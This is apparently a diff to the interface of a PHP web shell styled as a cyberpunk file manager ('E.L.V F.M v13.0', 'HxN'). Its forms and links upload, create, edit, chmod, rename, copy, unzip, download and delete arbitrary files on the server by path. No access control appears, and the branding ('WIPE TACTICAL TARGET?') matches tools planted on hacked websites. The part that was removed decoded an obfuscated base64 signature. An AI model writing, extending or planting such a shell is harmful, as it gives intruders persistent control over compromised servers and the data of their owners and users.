+                echo '<a href="?d='.urlencode($cum).'" style="color:var(--text-primary); text-decoration:none; font-weight:700; transition:color 0.2s;">'.htmlspecialchars($p).'</a>';
+            }
+            ?>
+            <span style="margin-left:auto; color:var(--text-dim); font-size:11px;">
+                <i class="fa-regular fa-hard-drive" style="color:var(--neon-cyan);"></i> 
+                <?= count($items) ?> items
+            </span>
+        </div>
+        
+        <!-- ===== NEON DIVIDER ===== -->
+        <div class="neon-divider-thin"></div>
+        
+        <!-- ===== TOOLS ROW ===== -->
         <div class="tools">
             <div class="neon-cyan-box">
-                <form method="post" enctype="multipart/form-data" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-                    <input type="file" name="u_f" style="margin-bottom:8px;">
-                    <button type="submit" class="btn-cyan-glow" style="width:100%; padding:10px;">DEPLOY</button>
+                <form method="post" enctype="multipart/form-data" style="display:flex; align-items:center; gap:6px;">
+                    <input type="file" name="u_f" style="flex:1; margin:0;">
+                    <button type="submit" class="btn-cyan-glow" style="padding:6px 10px;">UPLOAD</button>
                 </form>
             </div>
             <div class="neon-cyan-box">
-                <form method="post" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-                    <input type="text" name="f_n" placeholder="New file..." style="margin-bottom:8px;">
-                    <button type="submit" name="mk_f" class="btn-cyan-glow" style="width:100%; padding:10px;">MK FILE</button>
+                <form method="post" style="display:flex; align-items:center; gap:6px;">
+                    <input type="text" name="f_n" placeholder="new_file.php" style="flex:1; margin:0;">
+                    <button type="submit" name="mk_f" class="btn-cyan-glow" style="padding:6px 10px;">CREATE</button>
                 </form>
             </div>
             <div class="neon-cyan-box">
-                <form method="post" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-                    <input type="text" name="d_n" placeholder="New dir..." style="margin-bottom:8px;">
-                    <button type="submit" name="mk_d" class="btn-cyan-glow" style="width:100%; padding:10px;">MK DIR</button>
+                <form method="post" style="display:flex; align-items:center; gap:6px;">
+                    <input type="text" name="d_n" placeholder="new_folder" style="flex:1; margin:0;">
+                    <button type="submit" name="mk_d" class="btn-cyan-glow" style="padding:6px 10px;">MKDIR</button>
                 </form>
             </div>
         </div>
         
+        <!-- ===== COPY/PASTE INDICATOR ===== -->
+        <?php if(isset($_SESSION['copy_file'])): ?>
+        <div style="margin-bottom:12px; text-align:right; border:1px dashed var(--neon-cyan); padding:8px; border-radius:4px; background:rgba(255,255,255,0.05);">
+            <span style="color:var(--text-dim);">📋 Copied: </span>
+            <span style="color:var(--neon-cyan); font-weight:700;"><?= htmlspecialchars(basename($_SESSION['copy_file'])) ?></span>
+            <form method="post" style="display:inline; margin-left:12px;">
+                <button type="submit" name="paste_f" class="btn-cyan-glow" style="padding:4px 10px; font-size:9px;">PASTE HERE</button>
+            </form>
+        </div>
+        <?php endif; ?>
+        
+        <!-- ===== FILE TABLE ===== -->
         <div class="table-responsive">
             <table>
                 <thead>
                     <tr>
-                        <th>IDENTIFIER</th>
+                        <th>NAME</th>
                         <th class="col-size">SIZE</th>
-                        <th class="col-chmod">CHMOD</th>
-                        <th class="col-act">ACT</th>
+                        <th class="col-chmod">PERMS</th>
+                        <th class="col-act">ACTIONS</th>
                     </tr>
                 </thead>
                 <tbody>
-    <?php
-    $files = scandir($dir);
-    foreach ($files as $file) {
-        $p = $dir . DIRECTORY_SEPARATOR . $file;
-        $isD = is_dir($p);
-        $w = is_writable($p);
-        $i = $file;
-    ?>
-    <tr>
-        <td>
-            <span class="dir-label" data-type="<?= $isD ? 'dir' : 'file' ?>"><?= $isD ? '[D]' : '[F]' ?></span>
-            <a href="<?= $isD ? '?d='.urlencode($p) : '?edit='.urlencode($p).'&d='.urlencode($dir) ?>" class="item-t" data-writable="<?= $w ? '1' : '0' ?>"><?= $i ?></a>
-        </td>
-        <td class="col-size"><?= $isD ? '--' : formatSize(@filesize($p)) ?></td>
-        <td class="col-chmod">
-            <?php if($i !== '..'): ?>
-            <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
-                <input type="hidden" name="c_path" value="<?= $p ?>">
-                <input type="text" name="c_perm" value="<?= substr(sprintf('%o', @fileperms($p)), -4) ?>" class="<?= $w ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:45px;">
-                <button type="submit" name="ch_mod" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
-            </form>
-            <?php else: ?>
-            <span style="color:var(--text-dim);">-</span>
-            <?php endif; ?>
-        </td>
-                         <td class="col-chmod">
-                    <?php if($i !== '..'): ?>
-                    <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
-                        <input type="hidden" name="c_path" value="<?= $p ?>">
-                        <input type="text" name="c_perm" value="<?= substr(sprintf('%o', @fileperms($p)), -4) ?>" class="<?= $w ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:45px;">
-                        <button type="submit" name="ch_mod" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
-                    </form>
-                    <?php else: ?>
-                    <span style="color:var(--text-dim);">-</span>
+                    <?php if ($dir !== '/'): ?>
+                    <tr>
+                        <td>
+                            <span class="dir-label" data-type="dir">📁</span>
+                            <a href="?d=<?= urlencode(dirname($dir)) ?>" class="item-t" data-writable="1" style="color:var(--neon-magenta) !important;">[ .. (parent) ]</a>
+                        </td>
+                        <td class="col-size">–</td>
+                        <td class="col-chmod">–</td>
+                        <td class="col-act">–</td>
+                    </tr>
                     <?php endif; ?>
-                </td>
-                <td class="col-act" style="text-align:right; white-space:nowrap;">
-                    <?php if($i !== '..'): ?>
-                        <form method="post" style="display:inline-block; margin-right:5px;">
-                            <input type="hidden" name="old" value="<?= $p ?>">
-                            <input type="text" name="new" placeholder="Ren" style="width:45px; font-size:12px; padding:4px; display:inline-block;">
-                            <button type="submit" name="rename" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
-                        </form>
-                        <form method="post" style="display:inline-block; margin-right:5px;">
-                            <input type="hidden" name="c_path" value="<?= $p ?>">
-                            <button type="submit" name="copy_f" class="btn-act-small act-cp" title="COPY"><i class="fa-regular fa-copy"></i></button>
-                        </form>
-                        <form method="post" style="display:inline-block;">
-                            <input type="hidden" name="c_path" value="<?= $p ?>">
-                            <button type="submit" name="unzip_f" class="btn-act-small act-unzip" title="UNZIP"><i class="fa-solid fa-file-zipper"></i></button>
-                        </form>
-                        <?php if(!$isD): ?>
-                            <a href="?d=<?= urlencode($dir) ?>&download=<?= urlencode($p) ?>" class="btn-act-small act-dl" title="DOWNLOAD"><i class="fa-solid fa-download"></i></a>
-                            <a href="?d=<?= urlencode($dir) ?>&del=<?= urlencode($p) ?>" class="btn-act-small act-del" title="WIPE" onclick="return confirm('WIPE TACTICAL TARGET?')"><i class="fa-solid fa-skull"></i></a>
-                        <?php else: ?>
-                            <span style="color:var(--text-dim); font-size:11px;">[ NO ACTION ]</span>
-                        <?php endif; ?>
-                    <?php endif; ?>
-                </td>
-            </tr>
-            <?php } ?> </tbody>
-                    </table>
-                </div>
-        <?php } ?> <div class="glow-static">
-                <?php
-                    $secret = "ZW1hbm9OcnhIQCAha2lzaXJlQiBrYUcgYXluYXNhaUIgb2dhSiByZW5lQiBnbmFZIQ==";
-                    echo strrev(base64_decode($secret)); 
-                ?>
+                    
+                    <?php 
+                    $sorted_items = [];
+                    $dirs = [];
+                    $files_list = [];
+                    foreach ($items as $item) {
+                        if ($item['is_dir']) $dirs[] = $item;
+                        else $files_list[] = $item;
+                    }
+                    usort($dirs, function($a,$b) { return strcasecmp($a['name'], $b['name']); });
+                    usort($files_list, function($a,$b) { return strcasecmp($a['name'], $b['name']); });
+                    $sorted_items = array_merge($dirs, $files_list);
+                    
+                    foreach ($sorted_items as $item):
+                        $icon = $item['is_dir'] ? '📁' : '📄';
+                        $size_display = $item['is_dir'] ? '–' : formatSize($item['size']);
+                        $link = $item['is_dir'] ? '?d='.urlencode($item['path']) : '?edit='.urlencode($item['path']).'&d='.urlencode($dir);
+                    ?>
+                    <tr>
+                        <td>
+                            <span class="dir-label" data-type="<?= $item['is_dir'] ? 'dir' : 'file' ?>"><?= $icon ?></span>
+                            <a href="<?= $link ?>" class="item-t" data-writable="<?= $item['writable'] ? '1' : '0' ?>"><?= htmlspecialchars($item['name']) ?></a>
+                        </td>
+                        <td class="col-size"><?= $size_display ?></td>
+                        <td class="col-chmod">
+                            <?php if($item['name'] !== '..'): ?>
+                            <form method="post" style="display:inline-flex; align-items:center; gap:3px;">
+                                <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
+                                <input type="text" name="c_perm" value="<?= $item['perm'] ?>" class="<?= $item['writable'] ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:36px;">
+                                <button type="submit" name="ch_mod" class="btn-gray" style="padding:2px 5px; font-size:9px;">CH</button>
+                            </form>
+                            <?php else: ?>
+                            <span style="color:var(--text-dim);">–</span>
+                            <?php endif; ?>
+                        </td>
+                        <td class="col-act">
+                            <?php if($item['name'] !== '..'): ?>
+                                <?php if(!$item['is_dir'] && preg_match('/\.zip$/i', $item['name'])): ?>
+                                <form method="post" style="display:inline-block;">
+                                    <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
+                                    <button type="submit" name="unzip_f" class="btn-act-small" style="color:var(--neon-yellow);" title="UNZIP"><i class="fa-solid fa-file-zipper"></i></button>
+                                </form>
+                                <?php endif; ?>
+                                <?php if(!$item['is_dir']): ?>
+                                <a href="?d=<?= urlencode($dir) ?>&download=<?= urlencode($item['path']) ?>" class="btn-act-small act-dl" title="DOWNLOAD"><i class="fa-solid fa-download"></i></a>
+                                <?php endif; ?>
+                                <form method="post" style="display:inline-block;">
+                                    <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
+                                    <button type="submit" name="copy_f" class="btn-act-small act-cp" title="COPY"><i class="fa-regular fa-copy"></i></button>
+                                </form>
+                                <a href="?rename=<?= urlencode($item['path']) ?>&d=<?= urlencode($dir) ?>" class="btn-act-small" style="color:var(--neon-yellow);" title="RENAME"><i class="fa-regular fa-pen-to-square"></i></a>
+                                <a href="?del=<?= urlencode($item['path']) ?>&d=<?= urlencode($dir) ?>" class="btn-act-small act-del" title="DELETE" onclick="return confirm('WIPE: <?= htmlspecialchars($item['name']) ?>?')"><i class="fa-regular fa-trash-can"></i></a>
+                            <?php else: ?>
+                            <span style="color:var(--text-dim);">–</span>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </div>
+        <?php endif; ?>
+        
+        <!-- ===== NEON DIVIDER ===== -->
+        <div class="neon-divider"></div>
+        
+        <!-- ===== EDITOR MODE ===== -->
+        <?php if(isset($_GET['edit']) && !isset($_POST['save_f'])): 
+            $edit_path = $_GET['edit'];
+            if(file_exists($edit_path) && is_file($edit_path) && is_readable($edit_path)):
+                $file_content = htmlspecialchars(file_get_contents($edit_path));
+        ?>
+        <div style="margin-top:16px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                <h3 style="color:var(--neon-cyan); margin:0; text-shadow:0 0 6px rgba(0,229,255,0.3);">[ EDITING ] <?= htmlspecialchars(basename($edit_path)) ?></h3>
+                <span style="color:var(--text-dim); font-size:11px;"><?= htmlspecialchars($edit_path) ?> | <?= strlen($file_content) ?> bytes</span>
             </div>
-        <script>
-            <?= $bg_terminal_js ?>
-        </script>
-        </body>
+            <div class="neon-divider-thin"></div>
+            <form method="post">
+                <input type="hidden" name="f_path" value="<?= htmlspecialchars($edit_path) ?>">
+                <textarea id="code_editor" name="f_cnt" style="width:100%; min-height:400px; background:rgba(255,255,255,0.07); border:1px solid var(--border-subtle); color:var(--text-primary); padding:15px; font-family:'Share Tech Mono',monospace; font-size:13px; border-radius:4px; outline:none; resize:vertical;"><?= $file_content ?></textarea>
+                <div style="display:flex; gap:10px; margin-top:12px;">
+                    <button type="submit" name="save_f" class="btn-editor-save" style="flex:1;">SAVE CHANGES</button>
+                    <a href="?d=<?= urlencode($dir) ?>" class="btn-editor-cancel" style="flex:1;">CANCEL</a>
+                </div>
+            </form>
+        </div>
+        <?php 
+            else:
+                echo '<div class="alert" style="border-color:var(--neon-magenta); color:var(--neon-magenta);">[-] ERROR: FILE NOT READABLE: '.htmlspecialchars($edit_path).'</div>';
+            endif;
+        endif; 
+        ?>
+        
+        <!-- ===== RENAME MODE ===== -->
+        <?php if(isset($_GET['rename'])): 
+            $rename_path = $_GET['rename'];
+            $rename_basename = basename($rename_path);
+        ?>
+        <div style="border:2px solid var(--neon-yellow); background:rgba(255,255,255,0.05); padding:16px; border-radius:6px; margin-top:16px;">
+            <h3 style="color:var(--neon-yellow); margin-top:0; text-shadow:0 0 6px rgba(255,238,0,0.3);">RENAME ITEM</h3>
+            <div class="neon-divider-thin"></div>
+            <form method="post" style="display:flex; gap:10px; align-items:center; margin-top:12px;">
+                <span style="color:var(--text-secondary);"><?= htmlspecialchars($rename_basename) ?> →</span>
+                <input type="text" name="new" value="<?= htmlspecialchars($rename_basename) ?>" style="flex:1; border-color:var(--neon-yellow);">
+                <input type="hidden" name="old" value="<?= htmlspecialchars($rename_path) ?>">
+                <button type="submit" name="rename" class="btn-cyan-glow" style="border-color:var(--neon-yellow); color:var(--neon-yellow); box-shadow:var(--glow-yellow);">RENAME</button>
+                <a href="?d=<?= urlencode($dir) ?>" style="color:var(--neon-magenta); font-weight:700;">CANCEL</a>
+            </form>
+        </div>
+        <?php endif; ?>
+        
+        <!-- ===== NEON DIVIDER ===== -->
+        <div class="neon-divider"></div>
+        
+        <!-- ===== FOOTER ===== -->
+        <div class="glow-static">
+            <span style="color:var(--neon-magenta); text-shadow:0 0 6px rgba(255,0,255,0.3);">E.L.V F.M v13.0</span> 
+            <span style="color:var(--text-dim);">//</span> 
+            <span style="color:var(--neon-cyan); text-shadow:0 0 6px rgba(0,238,255,0.3);">HxN</span> 
+            <span style="color:var(--text-dim);">//</span> 
+            <span style="color:var(--neon-yellow); text-shadow:0 0 6px rgba(255,238,0,0.3);">CYBERPUNK METROCITY</span>
+        </div>
+    </div>
+
+    <!-- ===== JAVASCRIPT ===== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
+    <script>
+    <?= $bg_terminal_js ?>
+    
+    // === LIGHT NEON PARTICLES (PURPLE & CYAN) ===
+    (function() {
+        const canvas = document.createElement('canvas');
+        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1;pointer-events:none;opacity:0.4;';
+        document.body.appendChild(canvas);
+        const ctx = canvas.getContext('2d');
+        let W, H;
+        function resize() { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resize);
+        resize();
+        const particles = [];
+        const colors = ['0,229,255', '138,43,226', '255,0,255', '75,0,130'];
+        for (let i = 0; i < 50; i++) {
+            particles.push({
+                x: Math.random() * W, y: Math.random() * H,
+                vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5,
+                r: Math.random() * 2.5 + 0.5,
+                color: colors[Math.floor(Math.random() * colors.length)],
+                alpha: Math.random() * 0.3 + 0.05
+            });
+        }
+        function animate() {
+            ctx.clearRect(0, 0, W, H);
+            particles.forEach(p => {
+                p.x += p.vx; p.y += p.vy;
+                if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
+                if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(${p.color},${p.alpha})`;
+                ctx.fill();
+            });
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 150) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = `rgba(138,43,226,${0.08 * (1 - dist/150)})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+        animate();
+    })();
+    
+    // === CODEMIRROR INIT ===
+    document.addEventListener('DOMContentLoaded', function() {
+        const editorTextarea = document.getElementById('code_editor');
+        if (editorTextarea) {
+            var editor = CodeMirror.fromTextArea(editorTextarea, {
+                lineNumbers: true, matchBrackets: true,
+                mode: 'application/x-httpd-php', theme: 'dracula',
+                lineWrapping: true, indentUnit: 4, tabSize: 4
+            });
+            editor.setSize('100%', '400px');
+            editor.focus();
+        }
+    });
+    
+    // === CONSOLE AUTO-SCROLL ===
+    window.addEventListener('load', function() {
+        const consoles = document.querySelectorAll('.console');
+        consoles.forEach(c => {
+            c.scrollTop = c.scrollHeight;
+        });
+    });
+    
+    // === GLOW ANIMATION FOR BUTTONS ===
+    document.querySelectorAll('.btn-cyan-glow, .cyber-exec-btn').forEach(btn => {
+        btn.addEventListener('mouseenter', function() {
+            this.style.transform = 'scale(1.03)';
+        });
+        btn.addEventListener('mouseleave', function() {
+            this.style.transform = 'scale(1)';
+        });
+    });
+    
+    // === TOOLTIP EFFECT FOR ACTION BUTTONS ===
+    document.querySelectorAll('.btn-act-small').forEach(btn => {
+        btn.addEventListener('mouseenter', function() {
+            this.style.filter = 'brightness(1.4)';
+        });
+        btn.addEventListener('mouseleave', function() {
+            this.style.filter = 'brightness(1)';
+        });
+    });
+    
+    // === DYNAMIC STATUS BAR UPDATE ===
+    setInterval(() => {
+        const footer = document.querySelector('.glow-static');
+        if (footer) {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const oldSpan = footer.querySelector('.time-stamp');
+            if (oldSpan) oldSpan.remove();
+            const span = document.createElement('span');
+            span.className = 'time-stamp';
+            span.style.cssText = 'color:var(--neon-cyan); font-size:10px; margin-left:12px; text-shadow:0 0 4px rgba(0,238,255,0.3);';
+            span.textContent = '⏱ ' + timeStr;
+            footer.appendChild(span);
+        }
+    }, 1000);
+    </script>
+</body>
 </html>
+<?php 
+// End of main content area
+ob_end_flush(); 
+?>
